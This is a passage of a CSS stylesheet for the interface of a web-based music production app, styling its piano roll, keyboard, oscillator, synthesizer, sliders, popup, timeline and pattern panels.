	opacity: .5;
	transition: .1s opacity;
}
.gsuiPianoroll-slidersSelect::-webkit-scrollbar {
	display: none;
}
.gsuiPianoroll-slidersSelect:focus,
.gsuiPianoroll-slidersSelect:hover {
	opacity: 1;
}
.gsuiPianoroll-slidersSelect option {
	padding: 2px;
}
.gsuiPianoroll-block {
	--gsuiDragline-color: var( --gsuiBlocksManager-blockColor );
}
.gsuiPianoroll-block::after {
	content: attr( data-key );
	position: absolute;
	display: flex;
	align-items: center;
	justify-content: center;
	left: 0;
	width: 16px;
	max-width: 100%;
	height: 100%;
	color: #000;
	font-size: 11px;
	font-weight: bold;
	opacity: .4;
	pointer-events: none;
}

/* .......................................................................... */
.gsuiPianoroll-block-env {
	position: absolute;
	height: 100%;
	pointer-events: none;
}
.gsuiPianoroll-block-attack {
	left: 0;
}
.gsuiPianoroll-block-release {
	right: 0;
}
.gsuiPianoroll-block-prevLinked .gsuiPianoroll-block-attack,
.gsuiPianoroll-block-nextLinked .gsuiPianoroll-block-release {
	display: none;
}

/* .......................................................................... */
.gsuiPianoroll-block-envHandle {
	position: absolute;
	width: 6px;
	height: 6px;
	bottom: 100%;
	cursor: pointer;
	border-radius: 2px;
	pointer-events: initial;
	background-color: var( --gsuiBlocksManager-blockColor );
	filter: brightness( 1.3 );
	opacity: 0;
	transition: .1s opacity;
}
.gsuiPianoroll-block-attack .gsuiPianoroll-block-envHandle {
	right: -3px;
}
.gsuiPianoroll-block-release .gsuiPianoroll-block-envHandle {
	left: -3px;
}
.gsuiPianoroll-block-envHandle.gsui-hover,
.gsuiPianoroll-block:hover .gsuiPianoroll-block-envHandle,
.gsuiPianoroll-block.gsui-hover .gsuiPianoroll-block-envHandle {
	opacity: .8;
}

/* .......................................................................... */
.gsuiPianoroll-block-envBg {
	height: 100%;
	opacity: .3;
	transition: opacity .1s;
}
.gsuiPianoroll-block-envHandle.gsui-hover + .gsuiPianoroll-block-envBg {
	opacity: .5;
}
.gsuiPianoroll-block-attack .gsuiPianoroll-block-envBg {
	border-top-left-radius: 2px;
	background-image: linear-gradient(
		to bottom right,
		#000 50%,
		transparent calc( 50% + 1px )
	);
}
.gsuiPianoroll-block-release .gsuiPianoroll-block-envBg {
	border-top-right-radius: 2px;
	background-image: linear-gradient(
		to bottom left,
		#000 50%,
		transparent calc( 50% + 1px )
	);
}

/* .......................................................................... */
.gsuiPianoroll-block .gsuiDragline {
	top: 50%;
	right: 0;
}

/* .......................................................................... */
.gsuiPianoroll-block .gsuiDragline-drop {
	top: 50%;
	left: 0;
}
.gsuiPianoroll-block .gsuiDragline-drop::before {
	left: 0;
}
.gsuiPianoroll-block .gsuiDragline-dropActive::before {
	left: -4px;
}

/* .gsuiDragline-to */
/* .......................................................................... */
.gsuiPianoroll-block:not( :hover ):not( .gsui-hover ) .gsuiDragline:not( .gsuiDragline-dragging ) .gsuiDragline-to {
	background-color: transparent;
}
.gsuiPianoroll-block:hover      .gsuiDragline:not( .gsuiDragline-linked ) .gsuiDragline-to,
.gsuiPianoroll-block.gsui-hover .gsuiDragline:not( .gsuiDragline-linked ) .gsuiDragline-to {
	transform: translateX( 2px );
}
.gsuiPianoroll-block:hover      .gsuiDragline-linked .gsuiDragline-to,
.gsuiPianoroll-block.gsui-hover .gsuiDragline-linked .gsuiDragline-to {
	transform: translateX( -2px );
}
:root {
	--gsuiKeys-blackRow-bg: #0000001a;
	--gsuiKeys-blackRow-hover-bg: #00000026;
	--gsuiKeys-whiteRow-hover-bg: #ffffff08;
}

.gsuiKeys {
	--gsuiKeys-blackKey-gradA: #333;
	--gsuiKeys-blackKey-gradB: #444;
	--gsuiKeys-whiteKey-gradA: #888;
	--gsuiKeys-whiteKey-gradB: #eee;
	--gsuiKeys-activeKey-gradA: #353b52;
	--gsuiKeys-activeKey-gradB: #7886bd;
}
.gsuiKeys {
	display: block;
	position: relative;
	user-select: none;
	-webkit-user-select: none;
}

.gsuiKeys,
.gsuiKey {
	background-image: linear-gradient(
		90deg,
		var( --gsuiKeys-whiteKey-gradA ),
		var( --gsuiKeys-whiteKey-gradB ) );
}

.gsuiKey .gsuiKey-row {
	display: none;
}
.gsuiKey-row {
	position: absolute;
	box-sizing: border-box;
	z-index: 0;
	width: 100%;
	height: 1em;
}
.gsuiKeyBlack-row {
	background-color: var( --gsuiKeys-blackRow-bg );
}
.gsuiKey-row:hover { background-color: var( --gsuiKeys-whiteRow-hover-bg ); }
.gsuiKeyBlack-row:hover { background-color: var( --gsuiKeys-blackRow-hover-bg ); }

.gsuiKey[ data-key="0" ],
.gsuiKey[ data-key="5" ],
.gsuiKey-row[ data-key="0" ],
.gsuiKey-row[ data-key="5" ] {
	border-bottom: 1px solid #0003;
}
.gsuiKey-row > div {
	position: absolute;
	top: 0;
	bottom: 0;
	width: 100%;
}

.gsuiKey {
	box-sizing: border-box;
	position: absolute;
	left: 0;
	right: 0;
	height: 1.5em;
}
.gsuiKeyBlack {
	position: absolute;
	z-index: 1;
	width: 65%;
	height: 1em;
	border-radius: 0 .1em .1em 0;
	background-image: linear-gradient(
		90deg,
		var( --gsuiKeys-blackKey-gradA ),
		var( --gsuiKeys-blackKey-gradB )
	);
}
.gsuiKey[ data-key="0" ] {
	filter: brightness( .9 );
}
.gsuiKey[ data-key="0" ]::after {
	counter-increment: octave -1;
	content: "C" counter( octave );
	position: absolute;
	right: .25em;
	bottom: 0;
	color: #000;
	font-size: calc( 6px + .25em );
	font-family: monospace;
}
.gsuiKey.gsui-active {
	background-image: linear-gradient(
		90deg,
		var( --gsuiKeys-activeKey-gradA ),
		var( --gsuiKeys-activeKey-gradB )
	);
}

.gsuiKey:last-child {
	border-bottom: 0;
}
.gsuiKey[ data-key="9" ],
.gsuiKey[ data-key="7" ],
.gsuiKey[ data-key="2" ] {
	height: 2em;
}
.gsuiKey[ data-key="9" ],
.gsuiKey[ data-key="7" ],
.gsuiKey[ data-key="5" ],
.gsuiKey[ data-key="2" ],
.gsuiKey[ data-key="0" ] {
	margin-top: -.5em;
}
.gsuiOscillator {
	--gsuiOscillator-txt: #fff;
	--gsuiOscillator-txt-low: #fff7;
	--gsuiOscillator-bg: #666;
	--gsuiOscillator-pan: #d9f;
	--gsuiOscillator-gain: #ff9;
	--gsuiOscillator-pan-a: #faa;
	--gsuiOscillator-pan-b: #aaf;
	--gsuiOscillator-detune: #fff;
	--gsuiOscillator-slider-bg: #0003;
	--gsuiOscillator-grip-bg: #0002;
	--gsuiOscillator-wave-bg: #0006;
	--gsuiOscillator-wave-option: #444;
	--gsuiOscillator-wave-optionNative: #333;
}
.gsuiOscillator {
	display: grid;
	position: relative;
	box-sizing: border-box;
	height: 60px;
	color: var( --gsuiOscillator-txt );
	font-family: var( --gsui-font, sans-serif );
	background-color: var( --gsuiOscillator-bg );
	grid-template:
		"grip .   .        .        .          .      .    .    ." 6px
		"grip .   wavePrev waveNext waveSelect detune pan  gain ." 1fr
		"grip .   wave     wave     wave       detune pan  gain ." 1fr
		"grip .   wave     wave     wave       detune pan  gain ." 1fr
		"grip .   .        .        .          .      .    .    ." 6px
		/20px 6px 14px     14px     1fr        48px   48px 48px 8px;
	--gsuiSlider-lineBgColor: var( --gsuiOscillator-slider-bg );
}

/* .......................................................................... */
.gsuiOscillator-grip {
	grid-area: grip;
	display: flex;
	align-items: center;
	justify-content: center;
	font-size: 12px;
	cursor: grab;
	opacity: .6;
	background-color: var( --gsuiOscillator-grip-bg );
}

/* .......................................................................... */
.gsuiOscillator-pan    { grid-area: pan;    color: var( --gsuiOscillator-pan ); }
.gsuiOscillator-gain   { grid-area: gain;   color: var( --gsuiOscillator-gain ); }
.gsuiOscillator-detune { grid-area: detune; color: var( --gsuiOscillator-detune ); }
.gsuiOscillator-prop {
	position: relative;
	margin-left: 6px;
	--gsuiSlider-lineColor: currentColor;
}
.gsuiOscillator-sliderWrap {
	box-sizing: border-box;
	height: 100%;
}
.gsuiOscillator-sliderValue {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	display: flex;
	align-items: center;
	justify-content: center;
	font-family: var( --gsui-font-number, monospace );
	font-size: 14px;
	pointer-events: none;
}

/* .......................................................................... */
.gsuiOscillator-wave {
	grid-area: wave;
	position: relative;
	flex: 1;
	border-radius: 0 0 3px 3px;
	background-color: var( --gsuiOscillator-wave-bg );
}
.gsuiOscillator-wave .gsuiPeriodicWave {
	position: absolute;
}
.gsuiOscillator-wave .gsuiPeriodicWave:first-child { color: var( --gsuiOscillator-pan-a ); }
.gsuiOscillator-wave .gsuiPeriodicWave:last-child { color: var( --gsuiOscillator-pan-b ); }
.gsuiOscillator-wave polyline {
	stroke-opacity: .8;
}

/* .......................................................................... */
.gsuiOscillator-remove,
.gsuiOscillator-waveBtn,
.gsuiOscillator-waveSelect {
	border: 0;
	padding: 0;
	outline: 0;
	cursor: pointer;
	color: var( --gsuiOscillator-txt-low );
	background-color: var( --gsuiOscillator-wave-bg );
	transition: .1s color;
}
.gsuiOscillator-waveBtn {
	width: 14px;
	font-size: 16px;
	text-align: center;
}
.gsuiOscillator-wavePrev {
	grid-area: wavePrev;
	border-top-left-radius: 3px;
}
.gsuiOscillator-waveNext {
	grid-area: waveNext;
}
.gsuiOscillator-remove {
	position: absolute;
	top: 0;
	right: 2px;
	outline: 0;
	font-size: 12px;
	background: none;
}
.gsuiOscillator-waveBtn:focus,
.gsuiOscillator-waveBtn:hover,
.gsuiOscillator-waveSelect:focus,
.gsuiOscillator-waveSelect:hover,
.gsuiOscillator-remove:focus,
.gsuiOscillator-remove:hover {
	color: var( --gsuiOscillator-txt );
}

/* .......................................................................... */
.gsuiOscillator-waveSelect {
	grid-area: waveSelect;
	padding-left: 6px;
	font-size: 12px;
	font-family: inherit;
	border-top-right-radius: 3px;
	-moz-appearance: none;
	-webkit-appearance: none;
}
.gsuiOscillator-waveOpt {
	background-color: var( --gsuiOscillator-wave-option );
}
.gsuiOscillator-waveOptNative {
	background-color: var( --gsuiOscillator-wave-optionNative );
}
.gsuiPeriodicWave,
.gsuiPeriodicWave svg {
	width: 100%;
	height: 100%;
}
.gsuiPeriodicWave polyline {
	stroke: currentColor;
	fill: none;
}
.gsuiSynthesizer {
	--gsuiSynthesizer-bg: initial;
	--gsuiSynthesizer-color: #fff;
	--gsuiSynthesizer-head-bg: #555;
}
.gsuiSynthesizer {
	overflow: auto;
	position: relative;
	box-sizing: border-box;
	color: var( --gsuiSynthesizer-color );
	scrollbar-width: thin;
	scrollbar-color: #ddd #222;
}

/* .......................................................................... */
.gsuiSynthesizer-head {
	display: flex;
	align-items: center;
	padding-right: 8px;
	font-size: 14px;
	line-height: 1em;
	user-select: none;
	background-color: var( --gsuiSynthesizer-head-bg );
}
.gsuiSynthesizer-headTitle {
	opacity: .3;
	line-height: 24px;
	margin-left: 6px;
}
.gsuiSynthesizer-label {
	width: 42px;
	margin-left: 6px;
	text-align: center;
	font-size: 12px;
	opacity: .5;
}
.gsuiSynthesizer-labelPitch {
	margin-left: auto;
}

/* .......................................................................... */
.gsuiSynthesizer-env,
.gsuiSynthesizer-lfo {
	height: 118px;
}
.gsuiSynthesizer-env {
	display: none;
}

/* .......................................................................... */
.gsuiSynthesizer-headOscs {
	height: 24px;
}
.gsuiSynthesizer-oscList {
	display: grid;
	grid-auto-flow: row;
	grid-auto-rows: min-content;
	counter-reset: count-osc;
	background-color: var( --gsuiSynthesizer-bg );
}

/* .......................................................................... */
.gsuiSynthesizer .gsuiOscillator {
	transition: .2s filter;
}
.gsuiSynthesizer .gsuiOscillator:hover {
	filter: brightness( 1.05 );
}
.gsuiSynthesizer .gsuiOscillator:only-of-type .gsuiOscillator-remove {
	display: none;
}

/* .......................................................................... */
.gsuiSynthesizer-newOsc {
	position: relative;
	order: 2147483647;
	border: 0;
	height: 52px;
	color: inherit;
	font-size: 18px;
	cursor: pointer;
	border-radius: 2px;
	background: none;
	opacity: .4;
	transition: .2s opacity;
}
.gsuiSynthesizer-newOsc:focus,
.gsuiSynthesizer-newOsc:hover {
	opacity: .6;
}
.gsuiSynthesizer-newOsc::before {
	content: "";
	top: 6px;
	left: 6px;
	right: 6px;
	bottom: 6px;
	opacity: .4;
	border: 2px dashed;
	position: absolute;
}
:root {
	--gsuiDotline-color: #000;
	--gsuiDotline-lineWidth: 1px;
	--gsuiDotline-dotBg: transparent;
	--gsuiDotline-dotSize: 12px;
	--gsuiDotline-dotSizeHover: calc( var( --gsuiDotline-dotSize ) * 2 );
	--gsuiDotline-dotHandleSize: 10px;
}

.gsuiDotline {
	position: relative;
	overflow: hidden;
	color: var( --gsuiDotline-color );
	stroke: currentColor;
	stroke-width: var( --gsuiDotline-lineWidth );
}

.gsuiDotline svg {
	position: absolute;
	left: 0;
	top: 0;
	width: 100%;
	height: 100%;
}
.gsuiDotline polyline {
	fill: none;
}

.gsuiDotline-dot {
	position: absolute;
	z-index: 1;
	box-sizing: border-box;
	width: var( --gsuiDotline-dotSize );
	height: var( --gsuiDotline-dotSize );
	margin:
		calc( var( --gsuiDotline-dotSize ) / -2 ) 0 0
		calc( var( --gsuiDotline-dotSize ) / -2 );
	border-radius: 50%;
	border: 2px solid;
	background-color: var( --gsuiDotline-dotBg );
	transition: .2s;
	transition-property: width, height, margin-left, margin-top;
}
.gsuiDotline-dot:hover,
.gsuiDotline-dotSelected {
	--gsuiDotline-dotSize: var( --gsuiDotline-dotSizeHover );
}
.gsuiDotline-dot::before {
	content: "";
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	border: var( --gsuiDotline-dotHandleSize ) solid transparent;
	margin: calc( var( --gsuiDotline-dotHandleSize ) * -1 );
	border-radius: 50%;
}
:root {
	--gsuiPanels-bd: 1px solid #222;
	--gsuiPanels-extendSize: 4px;
	--gsuiPanels-extendColor: #222;
}
.gsuiPanels-cursor {
	position: fixed;
	z-index: 2147483647;
	left: 0;
	right: 0;
	top: 0;
	bottom: 0;
}

.gsuiPanels-x,
.gsuiPanels-y {
	display: flex;
}
.gsuiPanels-y {
	flex-direction: column;
}
.gsuiPanels-x > div:not( .gsuiPanels-extend ),
.gsuiPanels-y > div:not( .gsuiPanels-extend ) {
	position: relative;
}
.gsuiPanels-last {
	flex: 1 !important;
}
.gsuiPanels-x > div,
.gsuiPanels-y > div {
	box-sizing: border-box;
}
.gsuiPanels-x > div + div:not( .gsuiPanels-extend ) { border-left: var( --gsuiPanels-bd ); }
.gsuiPanels-y > div + div:not( .gsuiPanels-extend ) { border-top: var( --gsuiPanels-bd ); }

.gsuiPanels-noselect {
	user-select: none;
	-ms-user-select: none;
	-moz-user-select: none;
	-webkit-user-select: none;
}

/* .gsuiPanels-extend ------------------------------------------------------- */
.gsuiPanels-extend {
	position: absolute;
	z-index: 999;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	transition: background-color .2s;
}
.gsuiPanels-extend.gsui-hover,
.gsuiPanels-extend:hover {
	background-color: var( --gsuiPanels-extendColor );
}
.gsuiPanels-x > div > .gsuiPanels-extend {
	cursor: col-resize;
	width: var( --gsuiPanels-extendSize );
	margin-left: calc( var( --gsuiPanels-extendSize ) / -2 );
}
.gsuiPanels-y > div > .gsuiPanels-extend {
	cursor: row-resize;
	height: var( --gsuiPanels-extendSize );
	margin-top: calc( var( --gsuiPanels-extendSize ) / -2 );
}
#gsuiPopup {
	--gsuiPopup-dur: .4s;
	--gsuiPopup-bg: #555;
	--gsuiPopup-btn-bg: #999;
	--gsuiPopup-btnOk-bg: #67a;
	--gsuiPopup-radius: 4px;
	--gsuiPopup-padding: 10px;
	--gsuiPopup-minWidth: 250px;
	--gsuiPopup-header-bg: #333;
	--gsuiPopup-header-fontSize: 16px;
	--gsuiPopup-body-fontSize: 14px;
	--gsuiPopup-overlay-bg: #0009;
}
#gsuiPopup {
	display: flex;
	position: fixed;
	align-items: center;
	justify-content: center;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	z-index: 2147483647;
	color: #fff;
	background-color: var( --gsuiPopup-overlay-bg );
	backdrop-filter: blur( 10px );
	transition: var( --gsuiPopup-dur );
	transition-property: visibility, opacity;
}
#gsuiPopup:not( .gsuiPopup-show ) {
	opacity: 0;
	visibility: hidden;
}

#gsuiPopupWindow {
	overflow: hidden;
	min-width: var( --gsuiPopup-minWidth );
	border-radius: var( --gsuiPopup-radius );
	background-color: var( --gsuiPopup-bg );
	outline: 0;
	box-shadow: 0 0 50px #000;
}
#gsuiPopupWindow:focus {
	box-shadow:
		0 0 1px 2px #69b,
		0 0 50px #000;
}
.gsuiPopup-noCancel #gsuiPopupCancel,
.gsuiPopup-noText #gsuiPopupInputText {
	display: none;
}

#gsuiPopupHead {
	padding: var( --gsuiPopup-padding );
	font-size: var( --gsuiPopup-header-fontSize );
	background-color: var( --gsuiPopup-header-bg );
}
#gsuiPopupBody {
	font-size: var( --gsuiPopup-body-fontSize );
	padding: var( --gsuiPopup-padding );
}
#gsuiPopupContent:not( :empty ) + #gsuiPopupMessage,
#gsuiPopupContent:not( :empty ) ~ input {
	display: none;
}

#gsuiPopupInputText,
#gsuiPopupBtns input {
	padding: .6em 1.25em;
	border: 0;
	border-radius: 2px;
}
#gsuiPopupWindow input,
#gsuiPopupWindow select {
	outline: 0;
}
#gsuiPopupWindow input:focus,
#gsuiPopupWindow select:focus {
	box-shadow: 0 0 1px 2px #69b;
}
#gsuiPopupInputText {
	box-sizing: border-box;
	margin-top: var( --gsuiPopup-padding );
	padding: .6em;
	width: 100%;
	font-size: 18px;
}
#gsuiPopupBtns {
	margin-top: var( --gsuiPopup-padding );
	text-align: center;
}
#gsuiPopupBtns input {
	color: #fff;
	font-weight: bold;
	font-family: inherit;
	background-color: var( --gsuiPopup-btn-bg );
	cursor: pointer;
}
#gsuiPopupBtns input + input {
	margin-left: var( --gsuiPopup-padding );
}
#gsuiPopupBtns #gsuiPopupOk {
	background-color: var( --gsuiPopup-btnOk-bg );
}
#gsuiPopupWindow input[ type="text" ] {
	color: #fff;
	background-color: rgba( 255, 255, 255, .1 );
}
.gsuiSlider {
	display: block;
	position: relative;
	width: 100%;
	height: 100%;
	user-select: none;
}

.gsuiSlider-disable {
	cursor: not-allowed;
	--gsuiSlider-lineColor: #fff;
}
.gsuiSlider-disable .gsuiSlider-lineColor,
.gsuiSlider-disable .gsuiSlider-svgLineColor {
	opacity: .25;
}

.gsuiSlider-line,
.gsuiSlider-eventCatcher {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
}

.gsuiSlider-input,
.gsuiSlider-linear .gsuiSlider-svg,
.gsuiSlider-circular .gsuiSlider-line {
	display: none;
}

.gsuiSlider-line {
	overflow: hidden;
	border-radius: var( --gsuiSlider-lineRadius, 2px );
	background-color: var( --gsuiSlider-lineBgColor, #000 );
}
.gsuiSlider-lineColor {
	position: absolute;
	background-color: var( --gsuiSlider-lineColor, #fff );
}

.gsuiSlider-svg {
	position: absolute;
	width: 100%;
	height: 100%;
}
.gsuiSlider-svgLine,
.gsuiSlider-svgLineColor {
	fill: none;
	transform-origin: center;
}
.gsuiSlider-svgLine { stroke: var( --gsuiSlider-lineBgColor, #000 ); }
.gsuiSlider-svgLineColor { stroke: var( --gsuiSlider-lineColor, #fff ); }
.gsuiSliderGroup {
	--gsuiSliderGroup-currentTime-color: #ff9;
	--gsuiSliderGroup-slider-width: 6px;
	--gsuiSliderGroup-slider-bg: #0002;
	--gsuiSliderGroup-slider-color: var( --gsuiBlocksManager-blockColor );
	--gsuiSliderGroup-slider-color-selected: var( --gsuiBlocksManager-blockSelectedColor );
	--gsuiSliderGroup-loop-color: #0004;
}
.gsuiSliderGroup {
	display: block;
	position: relative;
	overflow: hidden;
	height: 100%;
	z-index: 0;
}
.gsuiSliderGroup-slidersWrap {
	position: absolute;
	width: 100%;
	top: 0;
	bottom: 0;
	overflow: auto;
	scrollbar-width: none;
}
.gsuiSliderGroup-slidersWrap::-webkit-scrollbar {
	display: none;
}
.gsuiSliderGroup-sliders {
	position: absolute;
	width: 1000000px;
	height: 100%;
	user-select: none;
}

/* slider */
/* .......................................................................... */
.gsuiSliderGroup-slider {
	position: absolute;
	overflow: hidden;
	top: 0;
	bottom: 0;
	cursor: pointer;
}
.gsuiSliderGroup-slider::before {
	content: "";
	position: absolute;
	height: 100%;
	width: var( --gsuiSliderGroup-slider-width );
	background-color: var( --gsuiSliderGroup-slider-bg );
}
.gsuiSliderGroup-slidersSelected .gsuiSliderGroup-slider:not( .gsuiSliderGroup-sliderSelected ) {
	pointer-events: none;
}
.gsuiSliderGroup-sliderInner {
	position: absolute;
	width: var( --gsuiSliderGroup-slider-width );
	color: var( --gsuiSliderGroup-slider-color );
	background-color: currentColor;
}
.gsuiSliderGroup-sliderSelected .gsuiSliderGroup-sliderInner {
	color: var( --gsuiSliderGroup-slider-color-selected );
}
.gsuiSliderGroup-sliderInner::after {
	content: "";
	position: absolute;
	box-sizing: border-box;
	left: var( --gsuiSliderGroup-slider-width );
	width: 1000000px;
	height: 100%;
	border: 0 solid;
	border-width: 1px 0 0;
	opacity: .6;
}
.gsuiSliderGroup-sliderInnerDown::after {
	border-width: 0 0 1px;
}

/* currentTime, loopA/B */
/* .......................................................................... */
.gsuiSliderGroup-loop,
.gsuiSliderGroup-currentTime {
	position: absolute;
	z-index: 1000000; /* 1. */
	top: 0;
	bottom: 0;
	pointer-events: none;
}
.gsuiSliderGroup-currentTime {
	width: 2px;
	margin-left: -1px;
	background-color: var( --gsuiSliderGroup-currentTime-color );
}
.gsuiSliderGroup-loop {
	background-color: transparent;
	transition: .2s background-color;
}
.gsuiSliderGroup-loopA { left: 0; }
.gsuiSliderGroup-loopB { right: 0; }
.gsuiSliderGroup-loopOn {
	background-color: var( --gsuiSliderGroup-loop-color );
}

/*
1.
	z-index: 1million; because all the sliders will have undefined high z-index.
	and we don't put the max value to not interfere with the popup z-index etc.
*/
.gsuiTimeline {
	--gsuiTimeline-bg: #222;
	--gsuiTimeline-color: #fff;
	--gsuiTimeline-loop-bg: #656586;
	--gsuiTimeline-lines-bg: #ffffff07;
	--gsuiTimeline-cursor-fill: #fff;
	--gsuiTimeline-loopBorder-bg: #fff;
}
.gsuiTimeline {
	position: relative;
	display: block;
	height: 100%;
	color: var( --gsuiTimeline-color );
	background-color: var( --gsuiTimeline-bg );
	--gsuiTimeline-beats-offset: 0;
	--gsuiTimeline-beats-incr: 1;
}

/* .......................................................................... */
.gsuiTimeline-steps {
	position: absolute;
	top: calc( 50% - 1px );
	width: 100%;
	height: 2px;
	pointer-events: none;
	background-repeat: no-repeat;
}

/* .......................................................................... */
.gsuiTimeline-beats {
	display: flex;
	height: 100%;
	counter-reset: beat calc( var( --gsuiTimeline-beats-offset ) - var( --gsuiTimeline-beats-incr ) + 1 );
	pointer-events: none;
}
.gsuiTimeline-beat {
	counter-increment: beat var( --gsuiTimeline-beats-incr );
	display: inline-block;
	margin-left: calc( var( --gsuiTimeline-beats-incr ) * 1em );
	opacity: var( --gsuiTimeline-beats-opacity, 0 );
}
.gsuiTimeline-beat:first-child {
	margin-left: calc( var( --gsuiTimeline-beats-offset ) * 1em );
}
.gsuiTimeline-beat::before {
	content: counter( beat );
	position: absolute;
	top: 0;
	bottom: 0;
	width: 52px;
	margin-left: -26px;
	display: flex;
	align-items: center;
	justify-content: center;
	font-size: 12px;
}
.gsuiTimeline-measure {
	font-weight: bold;
	opacity: 1;
}

/* .......................................................................... */
.gsuiTimeline-loopLine,
.gsuiTimeline-timeLine {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	bottom: 50%;
	transition: .2s background-color;
}
.gsuiTimeline-loopLine:hover,
.gsuiTimeline-timeLine:hover,
.gsuiTimeline-draggingLoopBody .gsuiTimeline-loopLine,
.gsuiTimeline-draggingLoopHandleA .gsuiTimeline-loopLine,
.gsuiTimeline-draggingLoopHandleB .gsuiTimeline-loopLine,
.gsuiTimeline-draggingTime .gsuiTimeline-timeLine {
	background-color: var( --gsuiTimeline-lines-bg );
}
.gsuiTimeline-timeLine {
	top: 50%;
	bottom: 0;
}

/* .......................................................................... */
.gsuiTimeline-cursor,
.gsuiTimeline-cursorPreview {
	position: absolute;
	margin-left: -8px;
	bottom: 1px;
	fill: var( --gsuiTimeline-cursor-fill );
	stroke: var( --gsuiTimeline-cursor-fill );
	stroke-width: 2px;
	stroke-linejoin: round;
	pointer-events: none;
}
.gsuiTimeline-cursorPreview {
	opacity: .5;
}

/* .......................................................................... */
.gsuiTimeline-loop {
	position: absolute;
	height: 6px;
	transition: .1s;
	transition-property: opacity, visibility;
	opacity: 0;
	visibility: hidden;
}
.gsuiTimeline-looping .gsuiTimeline-loop {
	opacity: 1;
	visibility: visible;
}
.gsuiTimeline-loopBody {
	height: 100%;
	transition: filter .2s;
	background-color: var( --gsuiTimeline-loop-bg );
}
.gsuiTimeline-loopBody:hover,
.gsuiTimeline-draggingLoopBody .gsuiTimeline-loopBody {
	filter: brightness( 1.2 );
}
.gsuiTimeline-loopHandleA { left: -5px; }
.gsuiTimeline-loopHandleB { right: -5px; }
.gsuiTimeline-loopHandle {
	position: absolute;
	top: 0;
	bottom: -6px;
	width: 25%;
	min-width: 7px;
	max-width: 12px;
}
.gsuiTimeline-loopBorderA { left: 0; }
.gsuiTimeline-loopBorderB { right: 0; }
.gsuiTimeline-loopBorder {
	position: absolute;
	top: 0;
	bottom: 0;
	width: 2px;
	transition: .2s;
	transition-property: bottom, background-color;
	pointer-events: none;
}
.gsuiTimeline-loopHandle:hover + .gsuiTimeline-loopBorder,
.gsuiTimeline-draggingLoopHandleA .gsuiTimeline-loopBorderA,
.gsuiTimeline-draggingLoopHandleB .gsuiTimeline-loopBorderB {
	bottom: -3px;
	background-color: var( --gsuiTimeline-loopBorder-bg );
}
.gsuiTimewindow {
	--gsuiTimewindow-bg: #456168;
	--gsuiTimewindow-color: #fff;
	--gsuiTimewindow-loop-bg: #0004;
	--gsuiTimewindow-panel-bg: #555;
	--gsuiTimewindow-panel-border: #222;
	--gsuiTimewindow-panelUp-bg: #444;
	--gsuiTimewindow-currentTime-fill: #ff9;
}
.gsuiTimewindow {
	position: relative;
	z-index: 0;
	display: flex;
	align-items: start;
	width: 100%;
	height: 100%;
	overflow: auto;
	color: var( --gsuiTimewindow-color );
	background-color: var( --gsuiTimewindow-bg );
	scrollbar-width: none;
}
.gsuiTimewindow::-webkit-scrollbar {
	display: none;
}

/* .......................................................................... */
.gsuiTimewindow-panel,
.gsuiTimewindow-main {
	display: flex;
	min-height: 100%;
	flex-direction: column;
}
.gsuiTimewindow-main {
	z-index: 0;
}
.gsuiTimewindow-panel {
	position: sticky;
	z-index: 1;
	left: 0;
	background-color: var( --gsuiTimewindow-panel-bg );
	box-shadow: 1px 0 var( --gsuiTimewindow-panel-border );
}
.gsuiTimewindow-panelUp,
.gsuiTimewindow-time {
	position: sticky;
	z-index: 2;
	top: 0;
	height: 32px;
}
.gsuiTimewindow-panelUp {
	display: flex;
	align-items: center;
	justify-content: flex-end;
	padding-right: 4px;
	background-color: var( --gsuiTimewindow-panelUp-bg );
	background-image: var( --gsuiWindow-bgImg );
}
.gsuiTimewindow-panelContent,
.gsuiTimewindow-mainBody {
	flex: 1;
}
.gsuiTimewindow-mainBody {
	width: 1000000px;
}
.gsuiTimewindow-mainContent {
	position: relative;
	z-index: 0;
}
.gsuiTimewindow-panelContentDown,
.gsuiTimewindow-contentDown {
	position: sticky;
	bottom: 0px;
	height: 96px;
	overflow: hidden;
	background-color: var( --gsuiTimewindow-bg );
	box-shadow: 0 -1px var( --gsuiTimewindow-panel-border );
}
.gsuiTimewindow-panelContentDown {
	background-color: inherit;
}

/* .......................................................................... */
.gsuiTimewindow-panelExtend {
	position: absolute;
}
.gsuiTimewindow-panelExtendX {
	left: 0;
	right: 0;
	top: -2px;
	height: 6px;
	cursor: ns-resize;
}
.gsuiTimewindow-panelExtendY {
	top: 0;
	bottom: 0;
	right: -2px;
	width: 6px;
	cursor: ew-resize;
}

/* .......................................................................... */
.gsuiTimewindow .gsuiTimeline {
	--gsuiTimeline-cursor-fill: var( --gsuiTimewindow-currentTime-fill );
}
.gsuiTimewindow-currentTime,
.gsuiTimewindow-loop {
	position: absolute;
	z-index: 1;
	top: 0;
	bottom: 0;
	pointer-events: none;
}
.gsuiTimewindow-currentTime {
	width: 2px;
	margin-left: -1px;
	background-color: var( --gsuiTimewindow-currentTime-fill );
}
.gsuiTimewindow-loop {
	opacity: 0;
	transition: .2s opacity;
	background-color: var( --gsuiTimewindow-loop-bg );
}
.gsuiTimewindow-looping .gsuiTimewindow-loop {
	opacity: 1;
}
.gsuiTimewindow-loopA { left: 0; }
.gsuiTimewindow-loopB { right: 0; }


/* .......................................................................... */
.gsuiTimewindow-step {
	display: flex;
	align-items: center;
	border: 0;
	outline: 0;
	padding: 4px;
	border-radius: 4px;
	font-size: inherit;
	font-family: var( --gsui-font-number );
	color: inherit;
	cursor: pointer;
	background: none;
	user-select: none;
	opacity: .5;
	transition: .2s opacity;
}
.gsuiTimewindow-step:focus,
.gsuiTimewindow-step:hover {
	opacity: 1;
}
.gsuiTimewindow-stepValue {
	white-space: nowrap;
	margin-right: 6px;
}
.gsuiPatterns {
	--gsuiPatterns-panel-menu-color: #919CA1;
	--gsuiPatterns-panel-menu-bg: #666;
	--gsuiPatterns-panel-btnSolid-bg: #444;
	--gsuiPatterns-newSynthBtn-color: #a5d6a7;
	--gsuiPatterns-newDrumsBtn-color: #44A1FC;

	--gsuiPatterns-synth-bg: #919CA1;
	--gsuiPatterns-synth-color: #222;
	--gsuiPatterns-synth-selected-color: #444;
	--gsuiPatterns-synth-expand-bg: #0000001a;
	--gsuiPatterns-synth-selected-bg: #66bb6a;
